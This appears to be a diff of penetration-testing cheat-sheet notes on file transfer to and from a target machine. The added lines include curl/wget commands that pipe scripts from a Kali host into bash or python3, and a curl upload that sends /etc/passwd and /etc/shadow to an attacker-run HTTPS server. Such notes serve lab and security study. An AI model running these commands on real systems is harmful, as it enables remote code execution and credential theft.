@@ -5,3 +5,30 @@ Option 1) We can use base64 to transfer the file, use this for smaller files
           We get the base 64 hash, copy it 
     Step 2) Now can save it in the target machine
           # echo -n '<base 64 echo>' | base64 -d > <Output file name>
+
+
+Option 2) Run http server on Linux and run the below command from system where we need file to be. 
+        # wget https://<http://Linux IP address:Port/File> -O /tmp/<File name>
+        # curl -o /tmp/<Output file name> https://<Linux IP Adderss:Port/File name>
+
+=======================================================================================================================================================================================
+
+We can also run the files directly without downloading the file 
+
+Option 1) We can use curl 
+        curl https://<Kali IP Address:Port>/Shell-File.sh | bash
+        curl https://<Kali IP Address:Port>/Python-File.py | python3 
+
+Option 2) We can use wget to acheive the same 
+        wget -qO- https://<Kali IP Address:Port>/Python-File.py | python3 
+
+
+=======================================================================================================================================================================================
+
+
+We can also use upload server for transfering the files 
+
+Step 1) openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' :- Run this in the Root 
+Step 2) sudo python3 -m uploadserver 443 --server-certificate ~/server.pem :- Start the upload server 
+Step 3) We can run the below command in the server from where the files has to be transfered. 
+        curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure {# we can send multiple files}
